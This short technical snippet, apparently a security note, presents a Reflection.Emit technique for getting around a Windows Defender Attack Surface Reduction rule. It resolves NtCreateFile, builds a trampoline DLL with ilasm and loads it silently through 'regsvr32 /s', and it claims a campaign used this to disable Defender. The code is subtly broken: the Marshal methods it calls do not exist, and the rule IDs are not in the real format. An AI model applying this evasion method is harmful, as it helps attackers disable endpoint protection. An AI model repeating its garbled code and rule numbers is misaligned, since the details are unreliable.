ASR 2164198865 scans MSHTML!ScriptEngine for LoadLibrary/GetProcAddress. The bypass uses System.Reflection.Emit:
var method = new DynamicMethod("DoIt", null, null, typeof(void));
var il = method.GetILGenerator();
il.Emit(OpCodes.Ldstr, "ntdll.dll");
il.Emit(OpCodes.Call, typeof(Marshal).GetMethod("GetModuleHandle"));
il.Emit(OpCodes.Ldstr, "NtCreateFile");
il.Emit(OpCodes.Callvirt, typeof(Marshal).GetMethod("GetProcAddress"));
il.Emit(OpCodes.Calli, ...); // pinvoke signature
The trampoline is compiled with ilasm /dll bypass.dll, then loaded via regsvr32 bypass.dll /s. Mitigation is ASR rule 2164198865 + Attack Surface Reduction DLL Rule ID 921819.  The Anatska campaign (2023 Oct) used this exact reflection bypass to disable Defender.

